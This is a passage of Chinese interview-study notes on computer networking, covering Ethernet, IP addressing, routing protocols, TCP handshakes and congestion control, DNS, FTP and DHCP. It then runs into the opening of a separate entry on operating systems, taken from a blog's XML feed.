CRC 的检验序列 信息部分的长度不超过 1500 MAC 地址MAC 地址是链路层地址，长度为 6 字节（48 位），用于唯一标识网络适配器（网卡）。一台主机拥有多少个适配器就有多少个 MAC 地址。例如笔记本电脑普遍存在无线网络适配器和有线网络适配器，因此就有两个 MAC 地址。 局域网局域网是典型的一种广播信道，主要特点是网络为一个单位所拥有，且地理范围和站点数目均有限。 主要有以太网、令牌环网、FDDI 和 ATM 等局域网技术，目前以太网占领着现有的有线局域网市场。 可以按照网络拓扑对局域网进行分类： 以太网*以太网是一种星型拓扑结构局域网。 早期使用集线器进行连接，它是一种物理层设备，作用于比特而不是帧，当一个比特到达接口时，集线器重新生成这个比特，并将其能量强度放大，从而扩大网络的传输距离。之后再将这个比特向其它所有接口。特别是，如果集线器同时收到同时从两个不同接口的帧，那么就发生了碰撞。 目前以太网使用交换机替代了集线器，它不会发生碰撞，能根据 MAC 地址进行存储转发。 以太网帧： 类型 ：标记上层使用的协议； 数据 ：长度在 46-1500 之间，如果太小则需要填充； FCS ：帧检验序列，使用的是 CRC 检验方法； 前同步码 ：只是为了计算 FCS 临时加入的，计算结束之后会丢弃。 交换机*交换机具有自学习能力，学习的是交换表的内容。交换表中存储着 MAC 地址到接口的映射。下图中，交换机有 4 个接口，主机 A 向主机 B 发送数据帧时，交换机把主机 A 到接口 1 的映射写入交换表中。为了发送数据帧到 B，先查交换表，此时没有主机 B 的表项，那么主机 A 就发送广播帧，主机 C 和主机 D 会丢弃该帧。主机 B 收下之后，查找交换表得到主机 A 映射的接口为 1，就发送数据帧到接口 1，同时交换机添加主机 B 到接口 3 的映射。 它是一种即插即用急用的设备，不需要网络管理员干预。 虚拟局域网虚拟局域网可以建立与物理位置无关的逻辑组，只有在同一个虚拟局域网中的成员才会收到链路层广播信息，例如下图中 (A1, A2, A3, A4) 属于一个虚拟局域网，A1 发送的广播会被 A2、A3、A4 收到，而其它站点收不到。 使用 VLAN 干线连接来建立虚拟局域网，每台交换机上的一个特殊端口被设置为干线端口，以互连 VLAN 交换机。IEEE 定义了一种扩展的以太网帧格式——802.1Q，用于跨 VLAN 干线的帧，它在标准以太网帧上加进了 4 字节首部 VLAN 标签，用于表示该帧属于哪一个虚拟局域网。 四、网络层*概述因为网络层是整个互联网的核心，因此应当让网络层尽可能简单。网络层向上只提供简单灵活的、无连接的、尽最大努力交互的数据报服务。 使用 IP 协议，可以把异构的物理网络连接起来，使得在网络层看起来好像是一个统一的网络。 与 IP 协议配套使用的还有三个协议： 地址解析协议 ARP（Address Resolution Protocol） 网际控制报文协议 ICMP（Internet Control Message Protocol） 网际组管理协议 IGMP（Internet Group Management Protocol） IP 数据报格式 版本 : 有 4（IPv4）和 6（IPv6）两个值； 首部长度 : 占 4 位，因此最大值为 15。值为 1 表示的是 1 个 32 位字的长度，也就是 4 字节。因为首部固定长度为 20 字节，因此该值最小为 5。如果可选字段的长度不是 4 字节的整数倍，就用尾部的填充部分来填充。 区分服务 : 用来获得更好的服务，一般情况下不使用。 总长度 : 包括首部长度和数据部分长度。 生存时间 ：TTL，它的存在是为了防止无法交付的数据报在互联网中不断兜圈子。以路由器跳数为单位，当 TTL 为 0 时就丢弃数据报。 协议 ：指出携带的数据应该上交给哪个协议进行处理，例如 ICMP、TCP、UDP 等。 首部检验和 ：因为数据报每经过一个路由器，都要重新计算检验和，因此检验和不包含数据部分可以减少计算的工作量。 标识 : 在数据报长度过长从而发生分片的情况下，相同数据报的不同分片具有相同的标识符。 片偏移 : 和标识符一起，用于发生分片的情况。片偏移的单位为 8 字节。 IP 地址编址方式IP 地址的编址方式经历了三个历史阶段： 分类 子网划分 无分类 1. 分类由两部分组成，网络号和主机号，其中不同分类具有不同的网络号长度，并且是固定的。 IP 地址 ::= {&lt; 网络号 &gt;, &lt; 主机号 &gt;} 2. 子网划分通过在主机号字段中拿一部分作为子网号，把两级 IP 地址划分为三级 IP 地址。注意，外部网络看不到子网的存在。 IP 地址 ::= {&lt; 网络号 &gt;, &lt; 子网号 &gt;, &lt; 主机号 &gt;} 要使用子网，必须配置子网掩码。一个 B 类地址的默认子网掩码为 255.255.0.0，如果 B 类地址的子网占两个比特，那么子网掩码为 11111111 11111111 11000000 00000000，也就是 255.255.192.0。 3. 无分类无分类编址 CIDR 消除了传统 A 类、B 类和 C 类地址以及划分子网的概念，使用网络前缀和主机号来对 IP 地址进行编码，网络前缀的长度可以根据需要变化。 IP 地址 ::= {&lt; 网络前缀号 &gt;, &lt; 主机号 &gt;} CIDR 的记法上采用在 IP 地址后面加上网络前缀长度的方法，例如 128.14.35.7/20 表示前 20 位为网络前缀。 CIDR 的地址掩码可以继续称为子网掩码，子网掩码首 1 长度为网络前缀的长度。 一个 CIDR 地址块中有很多地址，一个 CIDR 表示的网络就可以表示原来的很多个网络，并且在路由表中只需要一个路由就可以代替原来的多个路由，减少了路由表项的数量。把这种通过使用网络前缀来减少路由表项的方式称为路由聚合，也称为 构成超网 。 在路由表中的项目由“网络前缀”和“下一跳地址”组成，在查找时可能会得到不止一个匹配结果，应当采用最长前缀匹配来确定应该匹配哪一个。 地址解析协议 ARP网络层实现主机之间的通信，而链路层实现具体每段链路之间的通信。因此在通信过程中，IP 数据报的源地址和目的地址始终不变，而 MAC 地址随着链路的改变而改变。 ARP 实现由 IP 地址得到 MAC 地址。 每个主机都有一个 ARP 高速缓存，里面有本局域网上的各主机和路由器的 IP 地址到硬件地址的映射表。 如果主机 A 知道主机 B 的 IP 地址，但是 ARP 高速缓存中没有该 IP 地址到 MAC 地址的映射，此时主机 A 通过广播的方式发送 ARP 请求分组，主机 B 收到该请求后会发送 ARP 响应分组给主机 A 告知其 MAC 地址，随后主机 A 向其高速缓存中写入主机 B 的 IP 地址到 MAC 地址的映射。 网际控制报文协议 ICMPICMP 是为了更有效地转发 IP 数据报和提高交付成功的机会。它封装在 IP 数据报中，但是不属于高层协议。 ICMP 报文分为差错报告报文和询问报文。 1. PingPing 是 ICMP 的一个重要应用，主要用来测试两台主机之间的连通性。 Ping 发送的 IP 数据报封装的是无法交付的 UDP 用户数据报。 2. TracerouteTraceroute 是 ICMP 的另一个应用，用来跟踪一个分组从源点到终点的路径。 源主机向目的主机发送一连串的 IP 数据报。第一个数据报 P1 的生存时间 TTL 设置为 1，当 P1 到达路径上的第一个路由器 R1 时，R1 收下它并把 TTL 减 1，此时 TTL 等于 0，R1 就把 P1 丢弃，并向源主机发送一个 ICMP 时间超过差错报告报文； 源主机接着发送第二个数据报 P2，并把 TTL 设置为 2。P2 先到达 R1，R1 收下后把 TTL 减 1 再转发给 R2，R2 收下后也把 TTL 减 1，由于此时 TTL 等于 0，R2 就丢弃 P2，并向源主机发送一个 ICMP 时间超过差错报文。 不断执行这样的步骤，直到最后一个数据报刚刚到达目的主机，主机不转发数据报，也不把 TTL 值减 1。但是因为数据报封装的是无法交付的 UDP，因此目的主机要向源主机发送 ICMP 终点不可达差错报告报文。 之后源主机知道了到达目的主机所经过的路由器 IP 地址以及到达每个路由器的往返时间。 虚拟专用网 VPN由于 IP 地址的紧缺，一个机构能申请到的 IP 地址数往往远小于本机构所拥有的主机数。并且一个机构并不需要把所有的主机接入到外部的互联网中，机构内的计算机可以使用仅在本机构有效的 IP 地址（专用地址）。 有三个专用地址块： 10.0.0.0 ~ 10.255.255.255 172.16.0.0 ~ 172.31.255.255 192.168.0.0 ~ 192.168.255.255 VPN 使用公用的互联网作为本机构各专用网之间的通信载体。专用指机构内的主机只与本机构内的其它主机通信；虚拟指“好像是”，而实际上并不是，它有经过公用的互联网。 下图中，场所 A 和 B 的通信经过互联网，如果场所 A 的主机 X 要和另一个场所 B 的主机 Y 通信，IP 数据报的源地址是 10.1.0.1，目的地址是 10.2.0.3。数据报先发送到与互联网相连的路由器 R1，R1 对内部数据进行加密，然后重新加上数据报的首部，源地址是路由器 R1 的全球地址 125.1.2.3，目的地址是路由器 R2 的全球地址 194.4.5.6。路由器 R2 收到数据报后将数据部分进行解密，恢复原来的数据报，此时目的地址为 10.2.0.3，就交付给 Y。 网络地址转换 NAT专用网内部的主机使用本地 IP 地址又想和互联网上的主机通信时，可以使用 NAT 来将本地 IP 转换为全球 IP。 在以前，NAT 将本地 IP 和全球 IP 一一对应，这种方式下拥有 n 个全球 IP 地址的专用网内最多只可以同时有 n 台主机接入互联网。为了更有效地利用全球 IP 地址，现在常用的 NAT 转换表把运输层的端口号也用上了，使得多个专用网内部的主机共用一个全球 IP 地址。使用端口号的 NAT 也叫做网络地址与端口转换 NAPT。 路由器的结构路由器从功能上可以划分为：路由选择和分组转发。 分组转发结构由三个部分组成：交换结构、一组输入端口和一组输出端口。 路由器分组转发流程 从数据报的首部提取目的主机的 IP 地址 D，得到目的网络地址 N。 若 N 就是与此路由器直接相连的某个网络地址，则进行直接交付； 若路由表中有目的地址为 D 的特定主机路由，则把数据报传送给表中所指明的下一跳路由器； 若路由表中有到达网络 N 的路由，则把数据报传送给路由表中所指明的下一跳路由器； 若路由表中有一个默认路由，则把数据报传送给路由表中所指明的默认路由器； 报告转发分组出错。 路由选择协议路由选择协议都是自适应的，能随着网络通信量和拓扑结构的变化而自适应地进行调整。 互联网可以划分为许多较小的自治系统 AS，一个 AS 可以使用一种和别的 AS 不同的路由选择协议。 可以把路由选择协议划分为两大类： 自治系统内部的路由选择：RIP 和 OSPF 自治系统间的路由选择：BGP 1. 内部网关协议 RIPRIP 是一种基于距离向量的路由选择协议。距离是指跳数，直接相连的路由器跳数为 1，跳数最多为 15，超过 15 表示不可达。 RIP 按固定的时间间隔仅和相邻路由器交换自己的路由表，经过若干次交换之后，所有路由器最终会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器地址。 距离向量算法： 对地址为 X 的相邻路由器发来的 RIP 报文，先修改报文中的所有项目，把下一跳字段中的地址改为 X，并把所有的距离字段加 1； 对修改后的 RIP 报文中的每一个项目，进行以下步骤： 若原来的路由表中没有目的网络 N，则把该项目添加到路由表中； 否则：若下一跳路由器地址是 X，则把收到的项目替换原来路由表中的项目；否则：若收到的项目中的距离 d 小于路由表中的距离，则进行更新（例如原始路由表项为 Net2, 5, P，新表项为 Net2, 4, X，则更新）；否则什么也不做。 若 3 分钟还没有收到相邻路由器的更新路由表，则把该相邻路由器标为不可达，即把距离置为 16。 RIP 协议实现简单，开销小。但是 RIP 能使用的最大距离为 15，限制了网络的规模。并且当网络出现故障时，要经过比较长的时间才能将此消息传送到所有路由器。 2. 内部网关协议 OSPF开放最短路径优先 OSPF，是为了克服 RIP 的缺点而开发出来的。 开放表示 OSPF 不受某一家厂商控制，而是公开发表的；最短路径优先表示使用了 Dijkstra 提出的最短路径算法 SPF。 OSPF 具有以下特点： 向本自治系统中的所有路由器发送信息，这种方法是洪泛法。 发送的信息就是与相邻路由器的链路状态，链路状态包括与哪些路由器相连以及链路的度量，度量用费用、距离、时延、带宽等来表示。 只有当链路状态发生变化时，路由器才会发送信息。 所有路由器都具有全网的拓扑结构图，并且是一致的。相比于 RIP，OSPF 的更新过程收敛的很快。 3. 外部网关协议 BGPBGP（Border Gateway Protocol，边界网关协议） AS 之间的路由选择很困难，主要是因为互联网规模很大。并且各个 AS 内部使用不同的路由选择协议，就无法准确定义路径的度量。并且 AS 之间的路由选择必须考虑有关的策略，比如有些 AS 不愿意让其它 AS 经过。 BGP 只能寻找一条比较好的路由，而不是最佳路由。 每个 AS 都必须配置 BGP 发言人，通过在两个相邻 BGP 发言人之间建立 TCP 连接来交换路由信息。 五、运输层*网络层只把分组发送到目的主机，但是真正通信的并不是主机而是主机中的进程。运输层提供了进程间的逻辑通信，运输层向高层用户屏蔽了下面网络层的核心细节，使应用程序看起来像是在两个运输层实体之间有一条端到端的逻辑通信信道。 UDP 和 TCP 的特点 用户数据报协议 UDP（User Datagram Protocol）是无连接的，尽最大可能交付，没有拥塞控制，面向报文（对于应用程序传下来的报文不合并也不拆分，只是添加 UDP 首部），支持一对一、一对多、多对一和多对多的交互通信。 传输控制协议 TCP（Transmission Control Protocol）是面向连接的，提供可靠交付，有流量控制，拥塞控制，提供全双工通信，面向字节流（把应用层传下来的报文看成字节流，把字节流组织成大小不等的数据块），每一条 TCP 连接只能是点对点的（一对一）。 UDP 首部格式 首部字段只有 8 个字节，包括源端口、目的端口、长度、检验和。12 字节的伪首部是为了计算检验和临时添加的。 TCP 首部格式 序号 ：用于对字节流进行编号，例如序号为 301，表示第一个字节的编号为 301，如果携带的数据长度为 100 字节，那么下一个报文段的序号应为 401。 确认号 ：期望收到的下一个报文段的序号。例如 B 正确收到 A 发送来的一个报文段，序号为 501，携带的数据长度为 200 字节，因此 B 期望下一个报文段的序号为 701，B 发送给 A 的确认报文段中确认号就为 701。 数据偏移 ：指的是数据部分距离报文段起始处的偏移量，实际上指的是首部的长度。 确认 ACK ：当 ACK=1 时确认号字段有效，否则无效。TCP 规定，在连接建立后所有传送的报文段都必须把 ACK 置 1。 同步 SYN ：在连接建立时用来同步序号。当 SYN=1，ACK=0 时表示这是一个连接请求报文段。若对方同意建立连接，则响应报文中 SYN=1，ACK=1。 终止 FIN ：用来释放一个连接，当 FIN=1 时，表示此报文段的发送方的数据已发送完毕，并要求释放连接。 窗口 ：窗口值作为接收方让发送方设置其发送窗口的依据。之所以要有这个限制，是因为接收方的数据缓存空间是有限的。 TCP 的三次握手 假设 A 为客户端，B 为服务器端。 首先 B 处于 LISTEN（监听）状态，等待客户的连接请求。 A 向 B 发送连接请求报文段，SYN=1，ACK=0，选择一个初始的序号 x。 B 收到连接请求报文段，如果同意建立连接，则向 A 发送连接确认报文段，SYN=1，ACK=1，确认号为 x+1，同时也选择一个初始的序号 y。 A 收到 B 的连接确认报文段后，还要向 B 发出确认，确认号为 y+1，序号为 x+1。 B 收到 A 的确认后，连接建立。 三次握手的原因 第三次握手是为了防止失效的连接请求到达服务器，让服务器错误打开连接。 失效的连接请求是指，客户端发送的连接请求在网络中滞留，客户端因为没及时收到服务器端发送的连接确认，因此就重新发送了连接请求。滞留的连接请求并不是丢失，之后还是会到达服务器。如果不进行第三次握手，那么服务器会误认为客户端重新请求连接，然后打开了连接。但是并不是客户端真正打开这个连接，因此客户端不会给服务器发送数据，这个连接就白白浪费了。 TCP 的四次挥手 以下描述不讨论序号和确认号，因为序号和确认号的规则比较简单。并且不讨论 ACK，因为 ACK 在连接建立之后都为 1。 A 发送连接释放报文段，FIN=1。 B 收到之后发出确认，此时 TCP 属于半关闭状态，B 能向 A 发送数据但是 A 不能向 B 发送数据。 当 B 不再需要连接时，发送连接释放请求报文段，FIN=1。 A 收到后发出确认，进入 TIME-WAIT 状态，等待 2 MSL 时间后释放连接。 B 收到 A 的确认后释放连接。 四次挥手的原因 客户端发送了 FIN 连接释放报文之后，服务器收到了这个报文，就进入了 CLOSE-WAIT 状态。这个状态是为了让服务器端发送还未传送完毕的数据，传送完毕之后，服务器会发送 FIN 连接释放报文。 TIME_WAIT 客户端接收到服务器端的 FIN 报文后进入此状态，此时并不是直接进入 CLOSED 状态，还需要等待一个时间计时器设置的时间 2MSL。这么做有两个理由： 确保最后一个确认报文段能够到达。如果 B 没收到 A 发送来的确认报文段，那么就会重新发送连接释放请求报文段，A 等待一段时间就是为了处理这种情况的发生。 等待一段时间是为了让本连接持续时间内所产生的所有报文段都从网络中消失，使得下一个新的连接不会出现旧的连接请求报文段。 TCP 滑动窗口 窗口是缓存的一部分，用来暂时存放字节流。发送方和接收方各有一个窗口，接收方通过 TCP 报文段中的窗口字段告诉发送方自己的窗口大小，发送方根据这个值和其它信息设置自己的窗口大小。 发送窗口内的字节都允许被发送，接收窗口内的字节都允许被接收。如果发送窗口左部的字节已经发送并且收到了确认，那么就将发送窗口向右滑动一定距离，直到左部第一个字节不是已发送并且已确认的状态；接收窗口的滑动类似，接收窗口左部字节已经发送确认并交付主机，就向右滑动接收窗口。 接收窗口只会对窗口内最后一个按序到达的字节进行确认，例如接收窗口已经收到的字节为 {31, 34, 35}，其中 {31} 按序到达，而 {32, 33} 就不是，因此只对字节 31 进行确认。发送方得到一个字节的确认之后，就知道这个字节之前的所有字节都已经被接收。 TCP 可靠传输TCP 使用超时重传来实现可靠传输：如果一个已经发送的报文段在超时时间内没有收到确认，那么就重传这个报文段。 一个报文段从发送再到接收到确认所经过的时间称为往返时间 RTT，加权平均往返时间 RTTs 计算如下： 超时时间 RTO 应该略大于 RTTs，TCP 使用的超时时间计算如下： 其中 RTTd 为偏差。 TCP 流量控制流量控制是为了控制发送方发送速率，保证接收方来得及接收。 接收方发送的确认报文中的窗口字段可以用来控制发送方窗口大小，从而影响发送方的发送速率。将窗口字段设置为 0，则发送方不能发送数据。 TCP 拥塞控制如果网络出现拥塞，分组将会丢失，此时发送方会继续重传，从而导致网络拥塞程度更高。因此当出现拥塞时，应当控制发送方的速率。这一点和流量控制很像，但是出发点不同。流量控制是为了让接收方能来得及接受，而拥塞控制是为了降低整个网络的拥塞程度。 TCP 主要通过四种算法来进行拥塞控制：慢开始、拥塞避免、快重传、快恢复。 发送方需要维护一个叫做拥塞窗口（cwnd）的状态变量，注意拥塞窗口与发送方窗口的区别：拥塞窗口只是一个状态变量，实际决定发送方能发送多少数据的是发送方窗口。 为了便于讨论，做如下假设： 接收方有足够大的接收缓存，因此不会发生流量控制； 虽然 TCP 的窗口基于字节，但是这里设窗口的大小单位为报文段。 1. 慢开始与拥塞避免发送的最初执行慢开始，令 cwnd=1，发送方只能发送 1 个报文段；当收到确认后，将 cwnd 加倍，因此之后发送方能够发送的报文段数量为：2、4、8 … 注意到慢开始每个轮次都将 cwnd 加倍，这样会让 cwnd 增长速度非常快，从而使得发送方发送的速度增长速度过快，网络拥塞的可能也就更高。设置一个慢开始门限 ssthresh，当 cwnd &gt;= ssthresh 时，进入拥塞避免，每个轮次只将 cwnd 加 1。 如果出现了超时，则令 ssthresh = cwnd/2，然后重新执行慢开始。 2. 快重传与快恢复在接收方，要求每次接收到报文段都应该发送对已收到有序报文段的确认，例如已经接收到 M1 和 M2，此时收到 M4，应当发送对 M2 的确认。 在发送方，如果收到三个重复确认，那么可以确认下一个报文段丢失，例如收到三个 M2 ，则 M3 丢失。此时执行快重传，立即重传下一个报文段。 在这种情况下，只是丢失个别报文段，而不是网络拥塞，因此执行快恢复，令 ssthresh = cwnd/2 ，cwnd = ssthresh，注意到此时直接进入拥塞避免。慢开始和快恢复的快慢指的是 cwnd 的设定值，而不是 cwnd 的增长速率。慢开始 cwnd 设定为 1，而快恢复 cwnd 设定为 ssthresh。 六、应用层域名系统DNS 是一个分布式数据库，提供了主机名和 IP 地址之间的转换。这里的分布式数据库是指，每个站点只保留它自己的那部分数据。 域名具有层次结构，从上到下依次为：根域名、顶级域名、第二级域名。 DNS 可以使用 UDP 或者 TCP 进行传输，使用的端口号都为 53。大多数情况下 DNS 使用 UDP 进行传输，这就要求域名解析器和域名服务器都必须自己处理超时和重传来保证可靠性。在两种情况下会使用 TCP 进行传输： 因为 UDP 最大只支持 512 字节的数据，如果返回的响应超过的 512 字节就改用 TCP 进行传输。 区域传送是主域名服务器向辅助域名服务器传送变化的那部分数据，区域传送需要使用 TCP 进行传输。 文件传送协议FTP 使用 TCP 进行连接，它需要两个连接来传送一个文件： 控制连接：服务器以打开端口号 21 等待客户端的连接，客户端主动建立连接后，使用这个连接将客户端的命令传送给服务器，并传回服务器的应答。 数据连接：用来传送一个文件。 根据数据连接是否是服务器端主动建立，FTP 有主动和被动两种模式： 主动模式：服务器端主动建立数据连接，其中服务器端的端口号为 20，客户端的端口号随机，但是必须大于 1024，因为 0~1023 是熟知端口号。 被动模式：客户端主动建立数据连接，其中客户端的端口号由客户端自己指定，服务器端的端口号随机。 主动模式要求客户端开放端口号给服务器端，需要去配置客户端的防火墙。被动模式只需要服务器端开放端口号即可，无需客户端配置防火墙。但是被动模式会导致服务器端的安全性减弱，因为开放了过多的端口号。 远程登录协议TELNET 用于登录到远程主机上，并且远程主机上的输出也会返回。 TELNET 可以适应许多计算机和操作系统的差异，例如不同操作系统系统的换行符定义。 电子邮件协议一个电子邮件系统由三部分组成：用户代理、邮件服务器以及邮件协议。 邮件协议包含发送协议和读取协议，发送协议常用 SMTP，读取协议常用 POP3 和 IMAP。 1. POP3POP3 的特点是只要用户从服务器上读取了邮件，就把该邮件删除。 2. IMAPIMAP 协议中客户端和服务器上的邮件保持同步，如果不去手动删除邮件，那么服务器上的邮件也不会被删除。IMAP 这种做法可以让用户随时随地去访问服务器上的邮件。 3. SMTPSMTP 只能发送 ASCII 码，而互联网邮件扩充 MIME 可以发送二进制文件。MIME 并没有改动或者取代 SMTP，而是增加邮件主体的结构，定义了非 ASCII 码的编码规则。 动态主机配置协议DHCP (Dynamic Host Configuration Protocol) 提供了即插即用的连网方式，用户不再需要去手动配置 IP 地址等信息。DHCP 配置的内容不仅是 IP 地址，还包括子网掩码、网关 IP 地址。 DHCP 工作过程如下： 客户端发送 Discover 报文，该报文的目的地址为 255.255.255.255:67，源地址为 0.0.0.0:68，被放入 UDP 中，该报文被广播到同一个子网的所有主机上。 DHCP 服务器收到 Discover 报文之后，发送 Offer 报文给客户端，该报文包含了客户端所需要的信息。因为客户端可能收到多个 DHCP 服务器提供的信息，因此客户端需要进行选择。 如果客户端选择了某个 DHCP 服务器提供的信息，那么就发送 Request 报文给该 DHCP 服务器。 DHCP 服务器发送 Ack 报文，表示客户端此时可以使用提供给它的信息。 如果客户端和 DHCP 服务器不在同一个子网，就需要使用中继代理。 常用端口 应用 应用层协议 端口号 运输层协议 备注 域名解析 DNS 53 UDP/TCP 长度超过 512 字节时使用 TCP 动态主机配置协议 DHCP 67/68 UDP 简单网络管理协议 SNMP 161/162 UDP 文件传送协议 FTP 20/21 TCP 控制连接 21，数据连接 20 远程终端协议 TELNET 23 TCP 超文本传送协议 HTTP 80 TCP 简单邮件传送协议 SMTP 25 TCP 邮件读取协议 POP3 110 TCP 网际报文存取协议 IMAP 143 TCP Web 页面请求过程1. DHCP 配置主机信息 假设主机最开始没有 IP 地址以及其它信息，那么就需要先使用 DHCP 来获取。 主机生成一个 DHCP 请求报文，并将这个报文放入具有目的端口 67 和源端口 68 的 UDP 报文段中。 该报文段则被放入在一个具有广播 IP 目的地址(255.255.255.255) 和源 IP 地址（0.0.0.0）的 IP 数据报中。 该数据报则被放置在 MAC 帧中，该帧具有目的地址 FF:FF:FF:FF:FF:FF，将广播到与交换机连接的所有设备。 连接在交换机的 DHCP 服务器收到广播帧之后，不断地向上分解得到 IP 数据报、UDP 报文段、DHCP 请求报文，之后生成 DHCP ACK 报文，该报文包含以下信息：IP 地址、DNS 服务器的 IP 地址、默认网关路由器的 IP 地址和子网掩码。该报文被放入 UDP 报文段中，UDP 报文段有被放入 IP 数据报中，最后放入 MAC 帧中。 该帧的目的地址是请求主机的 MAC 地址，因为交换机具有自学习能力，之前主机发送了广播帧之后就记录了 MAC 地址到其转发接口的交换表项，因此现在交换机就可以直接知道应该向哪个接口发送该帧。 主机收到该帧后，不断分解得到 DHCP 报文。之后就配置它的 IP 地址、子网掩码和 DNS 服务器的 IP 地址，并在其 IP 转发表中安装默认网关。 2. ARP 解析 MAC 地址 主机通过浏览器生成一个 TCP 套接字，套接字向 HTTP 服务器发送 HTTP 请求。为了生成该套接字，主机需要知道网站的域名对应的 IP 地址。 主机生成一个 DNS 查询报文，该报文具有 53 号端口，因为 DNS 服务器的端口号是 53。 该 DNS 查询报文被放入目的地址为 DNS 服务器 IP 地址的 IP 数据报中。 该 IP 数据报被放入一个以太网帧中，该帧将发送到网关路由器。 DHCP 过程只知道网关路由器的 IP 地址，为了获取网关路由器的 MAC 地址，需要使用 ARP 协议。 主机生成一个包含目的地址为网关路由器 IP 地址的 ARP 查询报文，将该 ARP 查询报文放入一个具有广播目的地址（FF:FF:FF:FF:FF:FF）的以太网帧中，并向交换机发送该以太网帧，交换机将该帧转发给所有的连接设备，包括网关路由器。 网关路由器接收到该帧后，不断向上分解得到 ARP 报文，发现其中的 IP 地址与其接口的 IP 地址匹配，因此就发送一个 ARP 回答报文，包含了它的 MAC 地址，发回给主机。 3. DNS 解析域名 知道了网关路由器的 MAC 地址之后，就可以继续 DNS 的解析过程了。 网关路由器接收到包含 DNS 查询报文的以太网帧后，抽取出 IP 数据报，并根据转发表决定该 IP 数据报应该转发的路由器。 因为路由器具有内部网关协议（RIP、OSPF）和外部网关协议（BGP）这两种路由选择协议，因此路由表中已经配置了网关路由器到达 DNS 服务器的路由表项。 到达 DNS 服务器之后，DNS 服务器抽取出 DNS 查询报文，并在 DNS 数据库中查找待解析的域名。 找到 DNS 记录之后，发送 DNS 回答报文，将该回答报文放入 UDP 报文段中，然后放入 IP 数据报中，通过路由器反向转发回网关路由器，并经过以太网交换机到达主机。 4. HTTP 请求页面 有了 HTTP 服务器的 IP 地址之后，主机就能够生成 TCP 套接字，该套接字将用于向 Web 服务器发送 HTTP GET 报文。 在生成 TCP 套接字之前，必须先与 HTTP 服务器进行三次握手来建立连接。生成一个具有目的端口 80 的 TCP SYN 报文段，并向 HTTP 服务器发送该报文段。 HTTP 服务器收到该报文段之后，生成 TCP SYN ACK 报文段，发回给主机。 连接建立之后，浏览器生成 HTTP GET 报文，并交付给 HTTP 服务器。 HTTP 服务器从 TCP 套接字读取 HTTP GET 报文，生成一个 HTTP 响应报文，将 Web 页面内容放入报文主体中，发回给主机。 浏览器收到 HTTP 响应报文后，抽取出 Web 页面内容，之后进行渲染，显示 Web 页面。 参考资料 计算机网络, 谢希仁 JamesF.Kurose, KeithW.Ross, 库罗斯, 等. 计算机网络: 自顶向下方法 [M]. 机械工业出版社, 2014. W.RichardStevens. TCP/IP 详解. 卷 1, 协议 [M]. 机械工业出版社, 2006. Active vs Passive FTP Mode: Which One is More Secure? Active and Passive FTP Transfers Defined - KB Article #1138 How DHCP works and DHCP Interview Questions and Answers What is process of DORA in DHCP? What is DHCP Server ? Tackling emissions targets in Tokyo What does my ISP know when I use Tor? Technology-Computer Networking[1]-Computer Networks and the Internet P2P 网络概述. Circuit Switching (a) Circuit switching. (b) Packet switching.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>技术</tag>
        <tag>Java</tag>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[计算机操作系统]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[一、概述 操作系统基本特征 操作系统基本功能 系统调用 大内核和微内核 中断分类 二、进程管理 进程与线程 进程状态的切换 进程调度算法 进程同步 经典同步问题 进程通信 三、死锁 死锁的必要条件 死锁的处理方法 四、内存管理 虚拟内存 分页系统地址映射 页面置换算法 分段 段页式 分页与分段的比较 五、设备管理 磁盘调度算法 六、链接 编译系统 静态链接 目标文件 动态链接 参考资料 一、概述操作系统基本特征1. 并发并发是指宏观上在一段时间内能同时运行多个程序，而并行则指同一时刻能运行多个指令。 并行需要硬件支持，如多流水线或者多处理器。 操作系统通过引入进程和线程，使得程序能够并发运行。 2. 共享共享是指系统中的资源可以被多个并发进程共同使用。 有两种共享方式：互斥共享和同时共享。 互斥共享的资源称为临界资源，例如打印机等，在同一时间只允许一个进程访问，需要用同步机制来实现对临界资源的访问。 3. 虚拟虚拟技术把一个物理实体转换为多个逻辑实体。 主要有两种虚拟技术：时分复用技术和空分复用技术。例如多个进程能在同一个处理器上并发执行使用了时分复用技术，让每个进程轮流占有处理器，每次只执行一小个时间片并快速切换。 4. 异步异步指进程不是一次性执行完毕，而是走走停停，以不可知的速度向前推进。 操作系统基本功能1. 进程管理进程控制、进程同步、进程通信、死锁处理、处理机调度等。 2. 内存管理内存分配、地址映射、内存保护与共享、虚拟内存等。 3. 文件管理文件存储空间的管理、目录管理、文件读写管理和保护等。 4. 设备管理完成用户的 I/O 请求，方便用户使用各种设备，并提高设备的利用率。 主要包括缓冲管理、设备分配、设备处理、虛拟设备等。 系统调用如果一个进程在用户态需要使用内核态的功能，就进行系统调用从而陷入内核，由操作系统代为完成。 Linux 的系统调用主要有以下这些： Task Commands 进程控制 fork(); exit(); wait(); 进程通信 pipe(); shmget(); mmap(); 文件操作 open(); read(); write(); 设备操作 ioctl(); read(); write(); 信息维护 getpid(); alarm(); sleep(); 安全 chmod(); umask(); chown(); 大内核和微内核1. 大内核大内核是将操作系统功能作为一个紧密结合的整体放到内核。 由于各模块共享信息，因此有很高的性能。 2. 微内核由于操作系统不断复杂，因此将一部分操作系统功能移出内核，从而降低内核的复杂性。移出的部分根据分层的原则划分成若干服务，相互独立。 在微内核结构下，操作系统被划分成小的、定义良好的模块，只有微内核这一个模块运行在内核态，其余模块运行在用户态。 因为需要频繁地在用户态和核心态之间进行切换，所以会有一定的性能损失。 中断分类1. 外中断由 CPU 执行指令以外的事件引起，如 I/O 完成中断，表示设备输入/输出处理已经完成，处理器能够发送下一个输入/输出请求。此外还有时钟中断、控制台中断等。 2. 异常由 CPU 执行指令的内部事件引起，如非法操作码、地址越界、算术溢出等。 3. 陷入在用户程序中使用系统调用。 二、进程管理进程与线程1. 进程进程是资源分配的基本单位。 进程控制块 (Process Control Block, PCB) 描述进程的基本信息和运行状态，所谓的创建进程和撤销进程，都是指对 PCB 的操作。 下图显示了 4 个程序创建了 4 个进程，这 4 个进程可以并发地执行。 2. 线程线程是独立调度的基本单位。 一个进程中可以有多个线程，它们共享进程资源。 3. 区别 拥有资源：进程是资源分配的基本单位，但是线程不拥有资源，线程可以访问隶属进程的资源。 